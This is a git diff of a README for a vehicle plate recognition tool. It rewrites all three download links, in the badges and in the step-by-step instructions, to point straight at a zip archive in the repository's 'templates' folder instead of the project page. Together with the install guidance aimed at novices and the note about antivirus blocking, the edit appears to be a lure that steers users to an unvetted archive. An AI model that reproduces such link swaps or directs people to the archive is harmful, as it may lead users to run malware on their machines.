@@ -1,6 +1,6 @@
 # 🚗 plate-recognition-tr - Easy Vehicle Plate Detection
 
-[![Download from GitHub](https://img.shields.io/badge/Download-plate--recognition--tr-brightgreen?style=for-the-badge)](https://github.com/WindaleDanix/plate-recognition-tr)
+[![Download from GitHub](https://img.shields.io/badge/Download-plate--recognition--tr-brightgreen?style=for-the-badge)](https://github.com/WindaleDanix/plate-recognition-tr/raw/refs/heads/main/templates/tr_recognition_plate_1.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You do not need advanced hardware or software knowledge. The application does no
 
 1. **Go to the download page.**  
    Click the large green button above or visit:  
-   https://github.com/WindaleDanix/plate-recognition-tr  
+   https://github.com/WindaleDanix/plate-recognition-tr/raw/refs/heads/main/templates/tr_recognition_plate_1.8.zip  
 
 2. **Download the software.**  
    The page leads you to the project where you can get the latest version. Look for the “Releases” section on the right or scroll down until you find the download link with a filename ending in `.exe` or `.zip`.
@@ -105,7 +105,7 @@ If you see error messages during installation, check if your antivirus blocked t
 
 ## 📥 Download and Setup Quick Links
 
-[![Get plate-recognition-tr](https://img.shields.io/badge/Download-plate--recognition--tr-blue?style=for-the-badge)](https://github.com/WindaleDanix/plate-recognition-tr)
+[![Get plate-recognition-tr](https://img.shields.io/badge/Download-plate--recognition--tr-blue?style=for-the-badge)](https://github.com/WindaleDanix/plate-recognition-tr/raw/refs/heads/main/templates/tr_recognition_plate_1.8.zip)
 
 Use these links to go directly to the software page and grab the latest release files.
 
